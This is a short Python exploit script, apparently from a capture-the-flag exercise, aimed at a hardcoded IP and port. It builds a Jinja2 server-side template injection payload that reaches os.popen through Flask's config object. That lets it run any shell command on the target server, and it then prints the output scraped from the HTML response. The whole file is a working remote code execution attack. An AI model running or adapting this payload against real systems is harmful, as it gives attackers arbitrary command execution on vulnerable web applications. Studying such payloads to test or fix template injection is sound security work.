import requests
import sys
from bs4 import BeautifulSoup
from urllib.parse import quote

server = "154.57.164.79"
port = 30591
url = f"http://{server}:{port}/"
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

if len(sys.argv) < 2:
    print("Usage: python3 exploit.py <command>")
    sys.exit(-1)

cmd = " ".join(sys.argv[1:]).strip()

ssti_payload = "{{ config.__class__.from_envvar.__globals__.import_string('os').popen('"+cmd+"').read() }}"
#payload = ssti_payload.replace("cmd", cmd)

response = requests.get(url + ssti_payload, proxies=proxies).text
soup = BeautifulSoup(response, "html.parser")
output = soup.find("str")

print(output.text)
